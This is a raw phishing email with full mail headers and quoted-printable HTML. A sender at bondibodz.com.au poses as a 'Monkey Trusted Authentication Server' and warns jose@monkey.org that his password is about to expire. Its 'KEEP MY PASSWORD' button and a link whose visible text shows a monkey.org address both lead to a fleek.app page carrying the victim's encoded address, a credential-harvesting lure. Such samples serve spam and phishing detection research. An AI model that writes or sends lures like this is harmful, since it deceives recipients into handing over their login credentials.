@@ -1,0 +1,178 @@
+Return-Path: supports@bondibodz.com.au
+Delivered-To: jose@monkey.org
+X-FDA: 83389562508.14.B0969F4
+Received: from vps38252.aumanaged.com (vps38252.aumanaged.com
+ [182.160.154.13])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id DB0EE60002
+	for <jose@monkey.org>; Wed, 30 Apr 2025 05:21:32 +0000 (UTC)
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf20.b.hostedemail.com: domain of supports@bondibodz.com.au has no
+ SPF policy when checking 182.160.154.13)
+ smtp.mailfrom=supports@bondibodz.com.au;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1745990493;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=l0XFcl9MEcWdBcxGUhzJKT0oatjCjFhC+Wa6mE8TttQ=;
+	b=Z9DO6jiPntedtGQZhFonO/KapEYHMHHThMx52fnWciTBH9v7Hk5+pq2Lji6S4OUbOvbCEA
+	rNTVIKp4eOWSZt8g7Se1gGTdlIamB4RjK1gazTS1PO7rQd8wgBWDGg59o/5YyW5WrUWZne
+	S3mSFT6Mt0mMbQEC8Z9nZ4M3r06yXZU=
+ARC-Authentication-Results: i=1;
+	imf20.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf20.b.hostedemail.com: domain of supports@bondibodz.com.au has no
+ SPF policy when checking 182.160.154.13)
+ smtp.mailfrom=supports@bondibodz.com.au;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1745990493; a=rsa-sha256;
+	cv=none;
+	b=kGtpp9XWGfIoCFL5b/a+x0NIXdMlAJtKx9F3WKvbTx+mmUozKlGsI7ZUMO5MicZ6AsHD7G
+	0Lnp++sX1+r981BABPt1Zx5LpfScVA2v1+SsczZhFGNKW80NMNXtyyHXcRrliEPexxqYfq
+	/szNEvJBC67/SIRBIh9Sh/wNP3CXK8o=
+Received: from [198.23.219.236] (port=54952
+ helo=198-23-219-236-host.colocrossing.com)
+	by vps45455.aumanaged.com with esmtpsa  (TLS1.3) tls TLS_AES_256_GCM_SHA384
+	(Exim 4.98.1)
+	(envelope-from <supports@bondibodz.com.au>)
+	id 1u9zsv-00000000y14-0TIv
+	for jose@monkey.org;
+	Wed, 30 Apr 2025 15:21:29 +1000
+From: "Monkey Trusted Authentication Server" <supports@bondibodz.com.au>
+To: jose@monkey.org
+Subject: IMPORTANT: Keep Same Credential For Monkey Email
+Date: 29 Apr 2025 22:21:28 -0700
+Message-ID: <20250429222127.AEB892AB318810DC@bondibodz.com.au>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="windows-1252"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - vps45455.aumanaged.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - bondibodz.com.au
+X-Get-Message-Sender-Via: vps45455.aumanaged.com: authenticated_id:
+ supports@bondibodz.com.au
+X-Authenticated-Sender: vps45455.aumanaged.com: supports@bondibodz.com.au
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: DB0EE60002
+X-Stat-Signature: x9t7min1p7y561pa6kzx1ttjmexa776q
+X-Rspam-User: 
+X-Spam-Status: No, score=2.40
+X-HE-Tag: 1745990492-646793
+X-HE-Meta: 
+ U2FsdGVkX1+h4zvrHvuK6Pb16ZtrDfOORxtsh7RnJ/o8wLkyN91y1J146PLUO8H4P84KE34JhKnt9iRnSzeWQKjXnBLq7oLzLkqbf5dT32zRnftDtKQ2mHli3sRLoVR6Wf6EBYN/4lMMcGfwSF1yNefj5kx/HW4QzYc/cN/hqsnmY48Rq0s5LYRcRneq6M4uZQDsXLXNA3XSWXaaXloY3oOUz1zrsdtQA7eA1idNd1N+z/D6ENCxIbga4s3RZyBGCNJx2z5xq2/sjwsuo8z5vF67azwsoaVuGd+CDwrOx/QgC/+uyv2U/iem+TnBhvhWPlcgR/J7NKCOpsh4wiUJmnMeUJMgYPOXczsPLP/OdFIXn6ghbwaXmlJZBBJQImotTGAUkLMgcNFTUZdaj6R1AV1iqvDRTjJK2qAI/yJQjIorVYWI1slE9lVihGjLXsNfMwdtzbL2IrHUwrjnH2N+ILTEUFIA23vSHTKJ/sFNILgUIji3ExkSU6hyIdS+HrBMDa+6CHLUGcT6NL6ZQZ8Ht6FP2H23Gg8spkPYGuGzSGQ8RJOeoVWIvezzCudfiXKZlXQUzqC9r23E1pB+NyX7dFPGhv+0Nsnh1afDlJnXS6qx/Y+T+jgWPXzCAuXDha7ItrbbCgp3M3WJQgVM2aAJuE0hs2SooN+YYn2w1L9EP2WdlFqN9WaiMs7jIy9LEzyK4gyzxAVz6af+oGzBYSpOjnvCBN5o0/+bUhADAGNg+PB8o78pcJyl0UvO5yDpWFJmtayeXmsZrHQtKedylb16fOx0Yn7qfealLrphD/WWuVeW5DDU26F8SLZgI6NXDYX6LGeMMhr+60z7KCpIAIY8CZMiKbwZlKDhnMufJXUd5zVzaBi+UtCimXACXzZmWPbmdRXSbEoxpThYmRy9t+j+ob3qFJfZr2+RWAaWAlLM7v93TXqQm5Foq+6Xy/byg/egfWDCAwqC/MRBAX387/n8Oipkfhe
+ 4BD0YLB2qyexHHXp4/+9IFB7ptyu3B9GcAqtypDxUQW7a2TR5d34jS/eGA/kCzWEKvhT3gvSIghmutgnwvKGY6qUN9y2lNuFsclBw46tSrWThDmGzwa4luaUkct+d9jz6DwOcoPxjwlIn1qXBXiyHara+uKo+3fnfLjy8YT/6FIl+r/BLQbm1ud2zECygkWLhQmn5X4Ix8OBhFdMMN3SlnxRmF5zT0Cn2cbUJqY0qUOJfQLQjqW4BH022FHWtb/S7TndwQTqO2p8hGALph9e8YZwCcvd1OZOwtlyt+RTNYIfFUGxxrrfSPiYCfzv1e+9y2qPEr5WPiP84VAFI83d1ZysRj1aeLQ5dhoh+/AMnqDf+96xwS2pBtgTk4PlGAmYZgnreNMU82TPwdB+37293/YF7jcEqn1ZeoJg9NrkKMRiP9MozO6buZFKUiFh9MstBOuNUWAIbGeFUY5w/2sj10XtQcHK7aD+Ff7Jc2YcLxEGORbbsbpsP2+4oKXANjmBTcjSNJ9/i22/s0WWFmVeCHCxjVgeq2AR+DuFYkuneyETx1BXaokunqOKDY2D08+ED5QqWKZ2bi67C85UldbuVjrswTSZ1aJYDLHcCbxxkDQSMYiUvovNU2DfHugAGlb9LTeJjUYWtEvT3q9CaTqa3vcKHTCVxJJZ3Rxmt7VOBVHiP3I8lq4JwtsaEgA==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 192
+
+<html><head>
+
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dwindows-1=
+252"><meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"font-family: Arial, sans-serif;">
+<span style=3D"color: rgb(32, 31, 30); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: Calibri, sans-serif, serif, EmojiF=
+ont; font-size: 16px; font-style: normal; font-weight: 400; word-spacing: 0=
+px; float: none; display: inline !important; white-space: normal; orphans: =
+2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures:=
+ normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
+coration-style: initial; text-decoration-color: initial;"></span>
+<div class=3D"rcmBody">
+<div style=3D'border-width: 0px; margin: 0px 0px 0px 18px; padding: 5px 5px=
+ 5px 0px; border-image: none; width: 477px; color: rgb(32, 31, 30); text-tr=
+ansform: none; text-indent: 0px; letter-spacing: normal; font-family: wf_se=
+goe-ui_semibold, "Segoe UI Semibold", "Segoe WP Semibold", "Segoe UI", "Seg=
+oe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; font-size: 15px; font-=
+style: normal; font-weight: normal; text-decoration: none; word-spacing: 0p=
+x; vertical-align: baseline; float: left; white-space: normal; font-stretch=
+: inherit; font-variant-ligatures: normal; font-variant-caps: normal; -webk=
+it-text-stroke-width: 0px; font-variant-numeric: inherit; font-variant-east=
+-asian: inherit; -webkit-text-size-adjust: auto;'>
+<div style=3D'border-width: 0px; margin: 0px; padding: 5px 0px 5px 3px; bor=
+der-image: none; font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", T=
+ahoma, Arial, sans-serif, serif, EmojiFont; font-size: 13px; vertical-align=
+: baseline; font-stretch: inherit; background-color: rgb(244, 248, 245); fo=
+nt-variant-ligatures: inherit; font-variant-caps: inherit; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
+nherit;'>
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; border-image: =
+none; font-family: inherit; vertical-align: baseline; font-stretch: inherit=
+; font-variant-caps: inherit;">Mes<wbr>sage from Trusted server.</span></di=
+v></div>
+<div style=3D'border-width: 0px; margin: 0px; padding: 0px; border-image: n=
+one; color: rgb(32, 31, 30); text-transform: none; text-indent: 0px; letter=
+-spacing: normal; font-family: wf_segoe-ui_semibold, "Segoe UI Semibold", "=
+Segoe WP Semibold", "Segoe UI", "Segoe WP", Tahoma, Arial, sans-serif, seri=
+f, EmojiFont; font-size: 15px; font-style: normal; font-weight: normal; tex=
+t-decoration: none; word-spacing: 0px; vertical-align: baseline; white-spac=
+e: normal; font-stretch: inherit; font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px; font-variant-numeric: inh=
+erit; font-variant-east-asian: inherit; -webkit-text-size-adjust: auto;'>
+<div style=3D"border-width: 0px; margin: 0px; padding: 2px; border-image: n=
+one; width: 5px; height: 30px; font-family: inherit; vertical-align: baseli=
+ne; font-stretch: inherit; background-color: rgb(86, 166, 89); font-variant=
+-caps: inherit;"><br><br><br><br><br><br></div>
+<span><br></span></div></div>
+=20=20
+  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
+1">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+
+
+<div style=3D"margin: 0px auto; padding: 50px; max-width: 600px; background=
+-color: rgb(246, 246, 246);">
+<strong>=20=20=20=20
+=20=20=20=20
+=20=20=20=20
+=20=20=20=20=20=20
+=20=20=20=20=20=20=20=20
+          </strong><table width=3D"100%" style=3D"margin: 0px auto; width: =
+100%; border-collapse: collapse; max-width: 600px;" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0"><tbody><tr><td><strong><font color=3D"#000000">Mo=
+nkey E-Mail Service</font></strong><strong>
+            </strong><p>Valued jose,</p>
+            <p>The password to your email account (<strong>jose@monkey.org<=
+/strong>) will expire on 4/30/2025 10:21:27 PM.<br><br>We recommend that yo=
+u use the below to keep password valid to avoid login interruption.</p>
+    </td>
+    </tr>
+    <tr>
+    <td style=3D"padding: 10px 0px;">
+    <a style=3D"padding: 12px 24px; border-radius: 4px; color: rgb(255, 255=
+, 255); text-decoration: none; display: inline-block; background-color: rgb=
+(0, 119, 204);" href=3D"https://prehistoric-insect-limited.on-fleek.app/ios=
+=2Ehtml?data=3Dam9zZUBtb25rZXkub3Jn" target=3D"_blank">KEEP MY PASSWORD</a>=
+
+    </td>
+    </tr>
+    <tr>
+    <td style=3D"padding: 10px 0px;">
+    <p>You may visit <a href=3D"https://prehistoric-insect-limited.on-fleek=
+=2Eapp/ios.html?data=3Dam9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=3D"noope=
+ner noreferrer">monkey.org/jose@monkey.org/activity</a> to see email activi=
+ty.</p>
+    </td>
+    </tr>
+    <tr>
+    <td style=3D"padding: 10px 0px;">
+    <p><font color=3D"#768089"><em>&copy; 2025 Monkey Email Service. All Ri=
+ghts Reserved.</em></font><br></p><strong>
+    </strong></td></tr></tbody></table>
+</div>
+
+</body></html>
+
